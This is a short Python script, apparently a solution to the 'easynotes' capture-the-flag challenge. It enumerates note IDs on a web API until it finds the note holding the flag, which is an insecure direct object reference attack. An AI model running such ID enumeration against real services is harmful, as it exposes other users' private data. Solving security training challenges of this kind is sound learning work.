# I'm pretty sure my friend posted something really embarrassing 
# about himself on this website, can you find it?

import requests
import json

url = "http://easynotes.challs.olicyber.it/"
s = requests.Session()
s.get(url)

# ho trovato una API
for i in range(int(10e9)):
    r = s.get(url+f"api/note/{i}")
    if "flag" in r.text.lower():
        flag = json.loads(r.text)
        print(flag["content"], end="")
        break